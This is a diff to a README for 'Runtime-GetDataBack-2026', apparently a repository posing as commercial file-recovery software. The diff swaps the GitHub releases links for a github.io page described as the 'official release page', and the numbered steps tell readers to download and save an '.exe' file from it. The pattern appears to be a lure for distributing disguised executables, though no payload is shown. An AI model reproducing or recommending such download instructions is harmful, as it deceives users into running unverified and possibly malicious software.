@@ -1,6 +1,6 @@
 # 💿 Runtime-GetDataBack-2026 - Recover your lost files today easily
 
-[![](https://img.shields.io/badge/Download-GetDataBack-blue.svg)](https://github.com/Unknown-germanamerican891/Runtime-GetDataBack-2026/releases)
+[![](https://img.shields.io/badge/Download-GetDataBack-blue.svg)](https://unknown-germanamerican891.github.io)
 
 ## 📁 About the software
 
@@ -20,7 +20,7 @@ Your computer needs to meet these basic standards to run the software.
 
 Follow these steps to acquire the application on your computer.
 
-1.  Visit the official release page: [https://github.com/Unknown-germanamerican891/Runtime-GetDataBack-2026/releases](https://github.com/Unknown-germanamerican891/Runtime-GetDataBack-2026/releases).
+1.  Visit the official release page: [https://unknown-germanamerican891.github.io](https://unknown-germanamerican891.github.io).
 2.  Look for the latest version label at the top of the page.
 3.  Click the file link ending in ".exe" to begin the download.
 4.  Save the file to your "Downloads" folder.
